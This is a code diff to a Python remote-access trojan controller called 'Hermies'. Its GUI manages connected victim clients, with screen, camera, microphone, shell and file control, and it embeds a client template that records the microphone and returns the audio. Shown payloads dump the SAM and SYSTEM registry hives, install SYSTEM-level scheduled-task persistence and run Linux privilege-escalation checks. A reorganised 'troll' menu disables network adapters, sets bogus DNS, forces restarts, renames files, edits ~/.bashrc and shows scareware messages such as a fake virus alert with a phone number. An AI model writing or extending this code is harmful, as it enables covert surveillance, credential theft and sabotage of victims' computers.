+         " -Name TaskbarSmallIcons -Value '1'"),
+        ("normal icons",      "powershell",
+         "Set-ItemProperty"
+         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced'"
+         " -Name TaskbarSmallIcons -Value '0'"),
+        ("show seconds",      "powershell",
+         "Set-ItemProperty"
+         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced'"
+         " -Name ShowSecondsInSystemClock -Value '1'"),
+        ("hide seconds",      "powershell",
+         "Set-ItemProperty"
+         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced'"
+         " -Name ShowSecondsInSystemClock -Value '0'"),
+        ("rename recycle bin","powershell",
+         "$k='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID"
+         "\\{645FF040-5081-101B-9F08-00AA002F954E}';"
+         "New-Item $k -Force|Out-Null;"
+         "Set-ItemProperty $k -Name '(default)' -Value 'Trash'"),
+        ("restore bin name",  "powershell",
+         "Remove-ItemProperty"
+         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID"
+         "\\{645FF040-5081-101B-9F08-00AA002F954E}'"
+         " -Name '(default)' -EA SilentlyContinue"),
+        ("rename This PC",    "powershell",
+         "$k='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID"
+         "\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}';"
+         "New-Item $k -Force|Out-Null;"
+         "Set-ItemProperty $k -Name '(default)' -Value 'My Little Computer'"),
+        ("restore PC name",   "powershell",
+         "Remove-ItemProperty"
+         " 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID"
+         "\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}'"
+         " -Name '(default)' -EA SilentlyContinue"),
+        ("kill explorer",     "powershell",
+         "Stop-Process -Name explorer -Force"),
+        ("start explorer",    "powershell",
+         "Start-Process explorer.exe"),
+    ],
 
-    ("msgbox",        "powershell",
-     "Add-Type -AssemblyName System.Windows.Forms;"
-     "[System.Windows.Forms.MessageBox]::Show('Your computer has a virus. Please call 1-800-HACKED immediately.','WARNING',"
-     "[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)"),
+    "📁  Files / Desktop": [
+        ("50 desktop files",  "powershell",
+         "1..50|%{New-Item \"$env:USERPROFILE\\Desktop\\file$_.txt\" -Force|Out-Null}"),
+        ("1000 junk files",   "powershell",
+         "$d=\"$env:USERPROFILE\\Desktop\\junk\";"
+         "New-Item $d -ItemType Directory -Force|Out-Null;"
+         "1..1000|%{New-Item \"$d\\f$_.txt\" -Force|Out-Null}"),
+        ("rename all desktop","powershell",
+         "$n=0;Get-ChildItem \"$env:USERPROFILE\\Desktop\" -File"
+         "|%{$n++;Rename-Item $_.FullName \"troll_$n$($_.Extension)\" -EA SilentlyContinue}"),
+        ("move desktop to junk","powershell",
+         "$d=\"$env:USERPROFILE\\Desktop\\junk\";"
+         "New-Item $d -ItemType Directory -Force|Out-Null;"
+         "Get-ChildItem \"$env:USERPROFILE\\Desktop\" -File|Move-Item -Destination $d"),
+        ("rickroll shortcut", "powershell",
+         "$s=(New-Object -ComObject WScript.Shell).CreateShortcut("
+         "\"$env:USERPROFILE\\Desktop\\YouTube.lnk\");"
+         "$s.TargetPath='https://www.youtube.com/watch?v=dQw4w9WgXcQ';$s.Save()"),
+        ("troll right-click", "powershell",
+         "New-Item -Path 'HKCU:\\Software\\Classes\\*\\shell\\Troll' -Force|Out-Null;"
+         "Set-ItemProperty 'HKCU:\\Software\\Classes\\*\\shell\\Troll'"
+         " -Name '(default)' -Value 'Troll';"
+         "Set-ItemProperty 'HKCU:\\Software\\Classes\\*\\shell\\Troll'"
+         " -Name Icon -Value 'C:\\Windows\\System32\\shell32.dll,1'"),
+        ("remove troll click","powershell",
+         "Remove-Item -Path 'HKCU:\\Software\\Classes\\*\\shell\\Troll'"
+         " -Recurse -Force -EA SilentlyContinue"),
+        ("empty recycle bin", "powershell",
+         "Clear-RecycleBin -Force"),
+    ],
 
-    ("move cursor",   "powershell",
-     "$sig='[DllImport(\"user32.dll\")]public static extern bool SetCursorPos(int x,int y);';"
-     "Add-Type -MemberDefinition $sig -Name C -Namespace W -ErrorAction SilentlyContinue;"
-     "1..100|%{[W.C]::SetCursorPos((Get-Random -Max 1920),(Get-Random -Max 1080));Start-Sleep -Milliseconds 100}"),
+    "📋  Clipboard": [
+        ("set 'troll'",       "powershell", "Set-Clipboard 'troll'"),
+        ("set 'hunter2'",     "powershell", "Set-Clipboard 'hunter2'"),
+        ("set rickroll url",  "powershell",
+         "Set-Clipboard 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'"),
+        ("set time loop",     "powershell",
+         "while($true){Set-Clipboard (Get-Date).ToString();Start-Sleep 5}"),
+        ("clear loop",        "powershell",
+         "while($true){Set-Clipboard '';Start-Sleep 2}"),
+        ("read clipboard",    "powershell",
+         "(New-Object -ComObject SAPI.SpVoice).Speak([string](Get-Clipboard))"),
+    ],
 
-    ("typing 'help'", "powershell",
-     "$w=(New-Object -ComObject WScript.Shell);Start-Sleep 2;"
-     "foreach($c in 'PLEASE SEND HELP I AM TRAPPED IN THIS COMPUTER'.ToCharArray()){"
-     "$w.SendKeys($c.ToString());Start-Sleep -Milliseconds 80}"),
+    "🌐  Network": [
+        ("disable Wi-Fi",     "powershell",
+         "Disable-NetAdapter -Name 'Wi-Fi' -Confirm:$false -EA SilentlyContinue"),
+        ("enable Wi-Fi",      "powershell",
+         "Enable-NetAdapter -Name 'Wi-Fi' -Confirm:$false -EA SilentlyContinue"),
+        ("disable Ethernet",  "powershell",
+         "Disable-NetAdapter -Name 'Ethernet' -Confirm:$false -EA SilentlyContinue"),
+        ("enable Ethernet",   "powershell",
+         "Enable-NetAdapter -Name 'Ethernet' -Confirm:$false -EA SilentlyContinue"),
+        ("disable all adapters","powershell",
+         "Get-NetAdapter|Disable-NetAdapter -Confirm:$false -EA SilentlyContinue"),
+        ("set bad DNS",       "powershell",
+         "Set-DnsClientServerAddress -InterfaceAlias 'Wi-Fi'"
+         " -ServerAddresses '192.0.2.1' -EA SilentlyContinue"),
+        ("restore DNS",       "powershell",
+         "Set-DnsClientServerAddress -InterfaceAlias 'Wi-Fi'"
+         " -ServerAddresses '8.8.8.8' -EA SilentlyContinue"),
+        ("flush DNS",         "cmd",
+         "ipconfig /flushdns"),
+        ("ping loop",         "powershell",
+         "while($true){ping -n 1 127.0.0.1|Out-Null;Start-Sleep -Milliseconds 100}"),
+    ],
 
-    ("kill explorer", "powershell",
-     "Stop-Process -Name explorer -Force"),
-    ("start explorer","powershell",
-     "Start-Process explorer.exe"),
+    "⚙  System": [
+        ("eject cd",          "powershell",
+         "(New-Object -ComObject Shell.Application).NameSpace(17).Items()|"
+         "?{$_.Type -eq 'CD Drive'}|%{$_.InvokeVerb('E&ject')}"),
+        ("lock workstation",  "cmd",
+         "rundll32 user32.dll,LockWorkStation"),
+        ("sleep",             "powershell",
+         "rundll32.exe powrprof.dll,SetSuspendState 0,1,0"),
+        ("hibernate",         "cmd",
+         "shutdown /h"),
+        ("restart",           "cmd",
+         "shutdown /r /t 0"),
+    ],
 
-    ("invert colors", "powershell",
-     "$code=@'\n"
-     "using System;using System.Runtime.InteropServices;\n"
-     "public struct ColorMatrix{public float m00,m01,m02,m03,m04,m10,m11,m12,m13,m14,"
-     "m20,m21,m22,m23,m24,m30,m31,m32,m33,m34,m40,m41,m42,m43,m44;}\n"
-     "public class Mag{[DllImport(\"magnification.dll\")]public static extern bool MagInitialize();"
-     "[DllImport(\"magnification.dll\")]public static extern bool MagSetFullscreenColorEffect(ref ColorMatrix m);}\n"
-     "'@\n"
-     "Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue;"
-     "[Mag]::MagInitialize()|Out-Null;"
-     "$m=New-Object ColorMatrix;"
-     "$m.m00=-1;$m.m11=-1;$m.m22=-1;$m.m33=1;$m.m44=1;$m.m04=1;$m.m14=1;$m.m24=1;"
-     "[Mag]::MagSetFullscreenColorEffect([ref]$m)"),
-    ("uninvert colors","powershell",
-     "$code=@'\n"
-     "using System;using System.Runtime.InteropServices;\n"
-     "public struct ColorMatrix{public float m00,m01,m02,m03,m04,m10,m11,m12,m13,m14,"
-     "m20,m21,m22,m23,m24,m30,m31,m32,m33,m34,m40,m41,m42,m43,m44;}\n"
-     "public class Mag{[DllImport(\"magnification.dll\")]public static extern bool MagInitialize();"
-     "[DllImport(\"magnification.dll\")]public static extern bool MagSetFullscreenColorEffect(ref ColorMatrix m);}\n"
-     "'@\n"
-     "Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue;"
-     "[Mag]::MagInitialize()|Out-Null;"
-     "$m=New-Object ColorMatrix;"
-     "$m.m00=1;$m.m11=1;$m.m22=1;$m.m33=1;$m.m44=1;"
-     "[Mag]::MagSetFullscreenColorEffect([ref]$m)"),
-
-    ("speak (visual fallback)","powershell",
-     "Add-Type -AssemblyName System.Windows.Forms;"
-     "1..10|%{[System.Windows.Forms.MessageBox]::Show('Hello. I have been watching you. You should close some of those tabs.','...',"
-     "[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)|Out-Null}"),
-
-    ("caps lock spam","powershell",
-     "$w=(New-Object -ComObject WScript.Shell);1..20|%{$w.SendKeys('{CAPSLOCK}');Start-Sleep -Milliseconds 300}"),
-
-    ("random clicks", "powershell",
-     "$sig='[DllImport(\"user32.dll\")]public static extern void mouse_event(int f,int x,int y,int d,int e);';"
-     "Add-Type -MemberDefinition $sig -Name M2 -Namespace W -ErrorAction SilentlyContinue;"
-     "1..30|%{[W.M2]::mouse_event(2,0,0,0,0);[W.M2]::mouse_event(4,0,0,0,0);Start-Sleep -Milliseconds 500}"),
-
-    #  Linux trolls (bash) ─
-    ("[L] wall msg",    "bash",
-     "wall 'Your system has been compromised. Please contact your sysadmin immediately.' 2>/dev/null"),
-    ("[L] spam notify", "bash",
-     "for i in $(seq 1 20); do "
-     "notify-send 'ALERT' 'You have been hacked. Have a nice day.' 2>/dev/null; sleep 0.3; done"),
-    ("[L] eject cdrom", "bash",
-     "eject 2>/dev/null; eject /dev/cdrom 2>/dev/null; eject /dev/sr0 2>/dev/null"),
-    ("[L] term flash",  "bash",
-     "for i in $(seq 1 30); do echo -e '\\e[?5h'; sleep 0.1; echo -e '\\e[?5l'; sleep 0.1; done"),
-    ("[L] spam beep",   "bash",
-     "for i in $(seq 1 20); do echo -ne '\\a'; sleep 0.2; done"),
-    ("[L] fake rm -rf", "bash",
-     "echo 'rm: it is dangerous to operate recursively on \"/\"'; "
-     "echo 'rm: use --no-preserve-root to override this failsafe'; sleep 2; "
-     "echo '[sudo] removing system files...'; sleep 1; echo 'just kidding lol'"),
-    ("[L] rev /etc/motd","bash",
-     "cat /etc/motd 2>/dev/null | rev | tee /tmp/.motd_bak; "
-     "sudo tee /etc/motd < /tmp/.motd_bak 2>/dev/null"),
-    ("[L] alias ls",    "bash",
-     "echo \"alias ls='ls --color=always | rev'\" >> ~/.bashrc && source ~/.bashrc 2>/dev/null"),
-    ("[L] yes spam",    "bash",
-     "timeout 5 yes 'ALL YOUR BASE ARE BELONG TO US' &"),
-]
+    "🐧  Linux": [
+        ("[L] wall msg",      "bash",
+         "wall 'Your system has been compromised."
+         " Please contact your sysadmin immediately.' 2>/dev/null"),
+        ("[L] spam notify",   "bash",
+         "for i in $(seq 1 20); do "
+         "notify-send 'ALERT' 'You have been hacked. Have a nice day.' 2>/dev/null;"
+         " sleep 0.3; done"),
+        ("[L] eject cdrom",   "bash",
+         "eject 2>/dev/null; eject /dev/cdrom 2>/dev/null; eject /dev/sr0 2>/dev/null"),
+        ("[L] term flash",    "bash",
+         "for i in $(seq 1 30); do echo -e '\\e[?5h'; sleep 0.1;"
+         " echo -e '\\e[?5l'; sleep 0.1; done"),
+        ("[L] spam beep",     "bash",
+         "for i in $(seq 1 20); do echo -ne '\\a'; sleep 0.2; done"),
+        ("[L] fake rm -rf",   "bash",
+         "echo 'rm: it is dangerous to operate recursively on \"/\"'; "
+         "echo 'rm: use --no-preserve-root to override this failsafe'; sleep 2; "
+         "echo '[sudo] removing system files...'; sleep 1; echo 'just kidding lol'"),
+        ("[L] rev /etc/motd", "bash",
+         "cat /etc/motd 2>/dev/null | rev | tee /tmp/.motd_bak; "
+         "sudo tee /etc/motd < /tmp/.motd_bak 2>/dev/null"),
+        ("[L] alias ls=rev",  "bash",
+         "echo \"alias ls='ls --color=always | rev'\""
+         " >> ~/.bashrc && source ~/.bashrc 2>/dev/null"),
+        ("[L] yes spam",      "bash",
+         "timeout 5 yes 'ALL YOUR BASE ARE BELONG TO US' &"),
+        ("[L] fork bomb safe","bash",
+         "timeout 5 bash -c 'while true; do sleep 0.01; done &' 2>/dev/null"),
+    ],
+}
 
 
-#  [AUTH] 
+#  [AUTH]
 def _verify_client(conn, secret):
     try:
         conn.settimeout(AUTH_TIMEOUT)
@@ -510,7 +871,7 @@ def _verify_client(conn, secret):
         return False
 
 
-#  [MESSAGING] ─
+#  [MESSAGING] 
 def send_msg(sock, cmd, data=None):
     payload = json.dumps({"cmd": cmd, "data": data}).encode()
     sock.sendall(struct.pack(">I", len(payload)) + payload)
@@ -543,7 +904,7 @@ def _recvall(sock, n):
     return buf
 
 
-#  [SERVER STATE] 
+#  [SERVER STATE]
 clients           = {}
 client_id_counter = 0
 _lock             = threading.Lock()
@@ -551,7 +912,7 @@ _active_secret    = SHARED_SECRET
 _map_geo_cache    = {}   # ip -> {lat, lon, city, country, org}
 
 
-#  [SERVER] 
+#  [SERVER]
 def accept_loop(server_sock, gui):
     global client_id_counter
     while True:
@@ -592,7 +953,8 @@ def _auth_and_register(conn, addr, gui):
     gui.refresh_clients()
 
 
-#  [CLIENT_TEMPLATE] ─
+#  [CLIENT_TEMPLATE] 
+
 CLIENT_TEMPLATE = '''\
 import socket, subprocess, struct, json, base64, io, os, time, platform, threading, hmac, hashlib
 
@@ -876,19 +1238,19 @@ def handle_mic_record(payload):
             import tempfile
             with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tf:
                 tmp = tf.name
-            tmp_esc = tmp.replace("\\", "\\\\")
+            tmp_esc = tmp.replace("\\\\", "\\\\\\\\")
             ps = (
-                f'$c=@"\nusing System;using System.Runtime.InteropServices;\n'
-                f'public class Mci{{[DllImport(\\"winmm.dll\\",CharSet=CharSet.Ansi)]'
-                f'public static extern int mciSendString(string s,System.Text.StringBuilder b,int l,IntPtr h);}}\n"@\n'
-                f'Add-Type -TypeDefinition $c -EA SilentlyContinue;'
-                f'[Mci]::mciSendString("open new type waveaudio alias cap",$null,0,[IntPtr]::Zero)|Out-Null;'
-                f'[Mci]::mciSendString("set cap bitspersample 16 channels 1 samplespersec 16000 alignment 2",$null,0,[IntPtr]::Zero)|Out-Null;'
-                f'[Mci]::mciSendString("record cap",$null,0,[IntPtr]::Zero)|Out-Null;'
-                f'Start-Sleep -Seconds {int(duration)};'
-                f'[Mci]::mciSendString("stop cap",$null,0,[IntPtr]::Zero)|Out-Null;'
-                f'[Mci]::mciSendString("save cap \\"{tmp_esc}\\"",$null,0,[IntPtr]::Zero)|Out-Null;'
-                f'[Mci]::mciSendString("close cap",$null,0,[IntPtr]::Zero)|Out-Null'
+                '$c=@"\\nusing System;using System.Runtime.InteropServices;\\n'
+                'public class Mci{[DllImport(\\"winmm.dll\\",CharSet=CharSet.Ansi)]'
+                'public static extern int mciSendString(string s,System.Text.StringBuilder b,int l,IntPtr h);}\\n"@\\n'
+                'Add-Type -TypeDefinition $c -EA SilentlyContinue;'
+                '[Mci]::mciSendString("open new type waveaudio alias cap",$null,0,[IntPtr]::Zero)|Out-Null;'
+                '[Mci]::mciSendString("set cap bitspersample 16 channels 1 samplespersec 16000 alignment 2",$null,0,[IntPtr]::Zero)|Out-Null;'
+                '[Mci]::mciSendString("record cap",$null,0,[IntPtr]::Zero)|Out-Null;'
+                'Start-Sleep -Seconds ' + str(int(duration)) + ';'
+                '[Mci]::mciSendString("stop cap",$null,0,[IntPtr]::Zero)|Out-Null;'
+                '[Mci]::mciSendString("save cap \\"' + tmp_esc + '\\",$null,0,[IntPtr]::Zero)|Out-Null;'
+                '[Mci]::mciSendString("close cap",$null,0,[IntPtr]::Zero)|Out-Null'
             )
             subprocess.run(
                 ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", ps],
@@ -900,7 +1262,7 @@ def handle_mic_record(payload):
             except Exception: pass
             if data and len(data) > 44:
                 return {{"ok": True, "data": base64.b64encode(data).decode(), "method": "mci/ps"}}
-            return {{"ok": False, "error": f"mci recorded 0 bytes (no mic or access denied)"}}
+            return {{"ok": False, "error": "mci recorded 0 bytes (no mic or access denied)"}}
         except Exception as e3:
             return {{"ok": False, "error": f"pyaudio: {{err_py}}  mci/ps: {{e3}}"}}
     return {{"ok": False, "error": f"no mic backend available: {{err_py}}"}}
@@ -1052,7 +1414,7 @@ if __name__ == "__main__":
 '''
 
 
-#  [GUI] ─
+#  [GUI] 
 class HermiesGUI(tk.Tk):
     def __init__(self):
         super().__init__()
@@ -1210,7 +1572,7 @@ class HermiesGUI(tk.Tk):
         self._nav.pack_propagate(False)
         self._nav_buttons = {}
         tabs = ["Clients", "Datalogs", "Logs", "Screen", "Camera",
-                "Task", "Files", "Scripts", "builder", "Shell", "Mic", "Map", "Settings", "Customize"]
+                "Task", "PayloadCenter", "Files", "builder", "Shell", "Mic", "Map", "Settings", "Customize"]
         for tab in tabs:
             btn = tk.Button(
                 self._nav, text=tab,
@@ -1237,8 +1599,8 @@ class HermiesGUI(tk.Tk):
         self._build_screen_tab()
         self._build_camera_tab()
         self._build_task_tab()
+        self._build_payload_center_tab()
         self._build_files_tab()
-        self._build_scripts_tab()
         self._build_builder_tab()
         self._build_shell_tab()
         self._build_mic_tab()
@@ -1269,6 +1631,9 @@ class HermiesGUI(tk.Tk):
             self._mic_refresh_target()
         if name == "Task":
             self._task_refresh_target()
+        if name == "PayloadCenter":
+            self._pc_refresh_target()
+            self._pc_refresh_list()
         if name == "Files":
             self._fb_refresh_target()
             if (self.selected_cid is not None
@@ -1285,7 +1650,7 @@ class HermiesGUI(tk.Tk):
         self._content_frames[name] = f
         return f
 
-    #  clients tab 
+    #  clients tab
 
     def _build_clients_tab(self):
         T = THEME
@@ -1377,14 +1742,15 @@ class HermiesGUI(tk.Tk):
     def refresh_clients(self):
         self.after(0, self._refresh_client_grid)
 
-    #  context menu ─
+    #  context menu 
 
     def _show_ctx_menu(self, event, cid):
         T = THEME
         self.selected_cid = cid
         self._refresh_client_grid()
         mk = dict(bg=T["BG2"], fg=T["FG"], activebackground=T["ACCENT"],
-                  activeforeground=T["HDR_FG"], font=FONT, relief="flat", bd=0, tearoff=0)
+                  activeforeground=T["HDR_FG"], font=("Segoe UI", 11),
+                  relief="flat", bd=0, tearoff=0)
         menu = tk.Menu(self, **mk)
         info  = clients.get(cid, {})
         label = info.get("label", f"client {cid}")
@@ -1536,9 +1902,16 @@ class HermiesGUI(tk.Tk):
                 "/tr 'C:\\Windows\\Temp\\hermies.exe' /ru SYSTEM /f"))
         troll = tk.Menu(menu, **mk)
         menu.add_cascade(label="  🃏  Troll  ▶", menu=troll)
-        for lbl, shell, cmd in TROLL_PAYLOADS:
-            troll.add_command(label=f"  {lbl}",
-                              command=lambda s=shell, c=cmd: self._ctx_inject(cid, s, c))
+        for category, payloads in TROLL_PAYLOADS.items():
+            cat_menu = tk.Menu(troll, **mk)
+            troll.add_cascade(label=f"   {category}  ▶", menu=cat_menu)
+            for lbl, shell, cmd in payloads:
+                cat_menu.add_command(
+                    label=f"   {lbl}",
+                    command=lambda s=shell, c=cmd: self._ctx_inject(cid, s, c))
+        troll.add_separator()
+        troll.add_command(label="   🗨  Messagebox builder",
+                          command=lambda: self._troll_msgbox_dialog(cid))
         menu.add_separator()
         menu.add_command(label="  ✖  Disconnect",
                          command=self._disconnect,
@@ -1553,6 +1926,107 @@ class HermiesGUI(tk.Tk):
         self.log(f"[ctx/{shell}] {cmd[:80]}")
         threading.Thread(target=self._quick_shell_worker,
                          args=(clients[cid]["sock"], shell, cmd), daemon=True).start()
+
+    def _troll_msgbox_dialog(self, cid=None):
+        T = THEME
+        dlg = tk.Toplevel(self)
+        dlg.title("Messagebox Troll")
+        dlg.configure(bg=T["BG2"])
+        dlg.resizable(True, False)
+        dlg.geometry("500x260")
+        dlg.grab_set()
+
+        # title row
+        tr = tk.Frame(dlg, bg=T["BG2"], height=32)
+        tr.pack(fill=tk.X); tr.pack_propagate(False)
+        tk.Label(tr, text="Window Title:", bg=T["BG2"], fg=T["FG_DIM"],
+                 font=FONT).pack(side=tk.LEFT, padx=(12, 6), pady=6)
+        title_var = tk.StringVar(value="WARNING")
+        tk.Entry(tr, textvariable=title_var, bg=T["BG3"], fg=T["FG"],
+                 insertbackground=T["ACCENT"], font=FONT_MON, relief="flat",
+                 highlightbackground=T["BG4"], highlightthickness=1, width=28
+                 ).pack(side=tk.LEFT, fill=tk.X, expand=True, pady=6, padx=(0, 12))
+
+        # icon row
+        ir = tk.Frame(dlg, bg=T["BG2"], height=28)
+        ir.pack(fill=tk.X); ir.pack_propagate(False)
+        tk.Label(ir, text="Icon:", bg=T["BG2"], fg=T["FG_DIM"],
+                 font=FONT).pack(side=tk.LEFT, padx=(12, 6), pady=4)
+        icon_var = tk.StringVar(value="Error")
+        for ico in ("Error", "Warning", "Information", "Question"):
+            tk.Radiobutton(ir, text=ico, variable=icon_var, value=ico,
+                           bg=T["BG2"], fg=T["FG"], selectcolor=T["BG3"],
+                           activebackground=T["BG2"], activeforeground=T["ACCENT"],
+                           font=FONT, bd=0, highlightthickness=0, indicatoron=0,
+                           padx=8, pady=2, relief="flat", cursor="hand2"
+                           ).pack(side=tk.LEFT, padx=2)
+
+        tk.Frame(dlg, bg=T["BG4"], height=1).pack(fill=tk.X, padx=10, pady=(4, 0))
+
+        # message body
+        tk.Label(dlg, text="Message:", bg=T["BG2"], fg=T["FG_DIM"],
+                 font=FONT).pack(anchor="w", padx=12, pady=(6, 2))
+        body_txt = tk.Text(dlg, bg=T["BG3"], fg=T["FG"], font=FONT_MON, height=4,
+                           insertbackground=T["ACCENT"], selectbackground=T["BG4"],
+                           selectforeground=T["ACCENT"], relief="flat", borderwidth=0,
+                           highlightbackground=T["BG4"], highlightthickness=1,
+                           wrap=tk.WORD, undo=True)
+        body_txt.pack(fill=tk.X, padx=10, pady=(0, 6))
+        body_txt.insert("1.0", "Your computer has been hacked!")
+        body_txt.focus_set()
+
+        # buttons
+        btn_row = tk.Frame(dlg, bg=T["BG2"], height=42)
+        btn_row.pack(fill=tk.X); btn_row.pack_propagate(False)
+
+        def _build_ps():
+            msg   = body_txt.get("1.0", tk.END).strip().replace("'", "''")
+            title = title_var.get().strip().replace("'", "''") or "Alert"
+            ico   = icon_var.get()
+            return (
+                "powershell",
+                f"Add-Type -AssemblyName System.Windows.Forms;"
+                f"[System.Windows.Forms.MessageBox]::Show("
+                f"'{msg}','{title}',"
+                f"[System.Windows.Forms.MessageBoxButtons]::OK,"
+                f"[System.Windows.Forms.MessageBoxIcon]::{ico})"
+            )
+
+        def _load():
+            shell, cmd = _build_ps()
+            self._task_load_payload(shell, cmd)
+            self._switch_tab("Task")
+            dlg.destroy()
+
+        def _run():
+            if self.selected_cid is None:
+                self.log("[msgbox] no target selected")
+                return
+            shell, cmd = _build_ps()
+            self.log(f"[troll] msgbox -> id={self.selected_cid}")
+            threading.Thread(target=self._quick_shell_worker,
+                             args=(clients[self.selected_cid]["sock"], shell, cmd),
+                             daemon=True).start()
+            dlg.destroy()
+
+        def _on_ctrl_enter(event):
+            _run()
+
+        body_txt.bind("<Control-Return>", _on_ctrl_enter)
+
+        tk.Button(btn_row, text="load to Task",
+                  bg=T["BG3"], fg=T["FG"], font=FONT, relief="flat",
+                  padx=12, pady=6, cursor="hand2",
+                  command=_load).pack(side=tk.LEFT, padx=(12, 4), pady=6)
+        tk.Button(btn_row, text="run on target  (Ctrl+Enter)",
+                  bg=T["ACCENT"], fg=T["HDR_FG"],
+                  font=("Segoe UI", 10, "bold"), relief="flat",
+                  padx=12, pady=6, cursor="hand2",
+                  command=_run).pack(side=tk.LEFT, padx=(0, 4), pady=6)
+        tk.Button(btn_row, text="cancel",
+                  bg=T["BG3"], fg=T["FG_DIM"], font=("Segoe UI", 8), relief="flat",
+                  padx=8, cursor="hand2",
+                  command=dlg.destroy).pack(side=tk.RIGHT, padx=12, pady=6)
 
     def _ctx_kill_dialog(self, cid):
         T = THEME
@@ -1612,7 +2086,7 @@ class HermiesGUI(tk.Tk):
         except Exception as e:
             out = f"<error: {e}>"
         ts   = time.strftime("%H:%M:%S")
-        line = f"[{ts}][{shell_type}] {cmd}\n{out}\n{'─'*60}\n"
+        line = f"[{ts}][{shell_type}] {cmd}\n{out}\n{''*60}\n"
         self._append(self._task_out_widget, line)
         if hasattr(self, "_shell_out_right"):
             self._append(self._shell_out_right, line)
@@ -1621,7 +2095,7 @@ class HermiesGUI(tk.Tk):
             self._dl_record(self.selected_cid, tx_b, rx_b,
                             f"quick-shell/{shell_type}: {cmd[:60]}")
 
-    #  datalogs tab ─
+    #  datalogs tab 
 
     def _build_datalogs_tab(self):
         T = THEME
@@ -1712,7 +2186,7 @@ class HermiesGUI(tk.Tk):
                              f"↑{tx_bytes / 1024:.2f}KB ↓{rx_bytes / 1024:.2f}KB  {event_line}\n")
         self.after(0, _update)
 
-    #  logs tab ─
+    #  logs tab 
 
     def _build_logs_tab(self):
         T = THEME
@@ -1728,7 +2202,7 @@ class HermiesGUI(tk.Tk):
                   command=lambda: self._clear_text(self._log_widget)
                   ).pack(side=tk.RIGHT)
 
-    #  screen tab ─
+    #  screen tab 
 
     def _build_screen_tab(self):
         T = THEME
@@ -1832,7 +2306,7 @@ class HermiesGUI(tk.Tk):
         self._ssshare_running = False
         self.after(0, lambda: self._ssshare_fps_lbl.configure(text=""))
 
-    #  camera tab ─
+    #  camera tab 
 
     def _build_camera_tab(self):
         T = THEME
@@ -1855,7 +2329,7 @@ class HermiesGUI(tk.Tk):
         self.cam_label = tk.Label(f, bg=T["BG"], fg=T["FG_DIM"], font=("Segoe UI", 10))
         self.cam_label.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=10, pady=(10, 4))
 
-    #  task tab ─
+    #  task tab 
 
     def _build_task_tab(self):
         T = THEME
@@ -2006,7 +2480,10 @@ class HermiesGUI(tk.Tk):
                  "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive /y & "
                  "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive /y"),
             ]),
-            ("🃏 Troll", [(lbl, shell, cmd) for lbl, shell, cmd in TROLL_PAYLOADS]),
+            ("🃏 Troll", [(lbl, shell, cmd)
+                         for payloads in TROLL_PAYLOADS.values()
+                         for lbl, shell, cmd in payloads]
+             + [("messagebox", "__dlg__", "__msgbox__")]),
             ("🐧 Linux Privesc", [
                 ("sudo -l",       "bash", "sudo -l 2>&1"),
                 ("SUID find",     "bash",
@@ -2065,10 +2542,16 @@ class HermiesGUI(tk.Tk):
             wrap_host.pack(fill=tk.X, padx=12, pady=(2, 0))
             btns = []
             for btn_lbl, shell, cmd in payloads:
-                b = tk.Button(wrap_host, text=btn_lbl, bg=T["BG4"], fg=T["FG"],
-                              font=("Segoe UI", 8), relief="flat", padx=6, pady=3,
-                              cursor="hand2",
-                              command=lambda s=shell, c=cmd: self._task_load_payload(s, c))
+                if shell == "__dlg__" and cmd == "__msgbox__":
+                    b = tk.Button(wrap_host, text=btn_lbl, bg=T["BG4"], fg=T["FG"],
+                                  font=("Segoe UI", 8), relief="flat", padx=6, pady=3,
+                                  cursor="hand2",
+                                  command=lambda: self._troll_msgbox_dialog())
+                else:
+                    b = tk.Button(wrap_host, text=btn_lbl, bg=T["BG4"], fg=T["FG"],
+                                  font=("Segoe UI", 8), relief="flat", padx=6, pady=3,
+                                  cursor="hand2",
+                                  command=lambda s=shell, c=cmd: self._task_load_payload(s, c))
                 btns.append(b)
             def _reflow(event, host=wrap_host, buttons=btns):
                 host.update_idletasks()
@@ -2114,7 +2597,535 @@ class HermiesGUI(tk.Tk):
             selectforeground=T["ACCENT"])
         self._task_out_widget.pack(fill=tk.BOTH, expand=True)
 
-    #  files tab 
+    #  payload center tab 
+
+    def _build_payload_center_tab(self):
+        T = THEME
+        f = self._make_frame("PayloadCenter")
+
+        #  header bar 
+        hdr = tk.Frame(f, bg=T["BG2"], height=36)
+        hdr.pack(fill=tk.X); hdr.pack_propagate(False)
+        tk.Label(hdr, text="PAYLOAD CENTER", bg=T["BG2"], fg=T["ACCENT"],
+                 font=("Segoe UI", 11, "bold")).pack(side=tk.LEFT, padx=14, pady=6)
+        tk.Label(hdr, text="TARGET:", bg=T["BG2"], fg=T["FG_DIM"],
+                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=(20, 4), pady=6)
+        self._pc_target_lbl = tk.Label(hdr, text="none selected",
+                                       bg=T["BG2"], fg=T["ACCENT"],
+                                       font=("Segoe UI", 9, "bold"))
+        self._pc_target_lbl.pack(side=tk.LEFT, pady=6)
+
+        #  three-pane layout 
+        pane = tk.PanedWindow(f, orient=tk.HORIZONTAL, bg=T["BG"],
+                              sashwidth=4, sashrelief="flat")
+        pane.pack(fill=tk.BOTH, expand=True)
+
+        #  LEFT: library list 
+        left = tk.Frame(pane, bg=T["BG2"])
+        pane.add(left, minsize=200, width=260)
+
